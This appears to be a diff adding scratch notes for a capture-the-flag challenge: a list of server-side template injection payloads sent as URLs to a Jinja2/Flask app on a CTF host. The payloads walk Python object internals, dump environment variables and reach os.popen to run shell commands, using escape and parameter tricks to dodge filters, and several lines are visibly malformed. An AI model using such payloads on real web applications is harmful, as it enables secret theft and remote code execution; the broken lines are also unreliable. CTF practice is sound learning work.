@@ -1,0 +1,11 @@
+https://silent-blade.pwny.shellmates.club/submit?value={{request[request.args.param1][request.args.param2]}}&param1=__class__&param2=__mro__&param3=__subclasses__
+https://silent-blade.pwny.shellmates.club/submit?value={{os.environ}}
+
+https://silent-blade.pwny.shellmates.club/submit?value={{self[request.args.param1][]}}&param1=__dict__&param2=__mro__&param3=__subclasses__
+https://silent-blade.pwny.shellmates.club/submit?value={{url\x5ffor[request.args.param1]}}&param1=__dict__
+
+
+{{.__globals__.__builtins__.__import__('os').popen('ls -R').read()}}
+https://silent-blade.pwny.shellmates.club/submit?value={{
+request.application[request.args.param1][request.args.param2][request.args.param3][request.args.param3].popen('ls -R')
+}}&param1=__globals__&param2=__builtins__&param3=__import__&param4=os
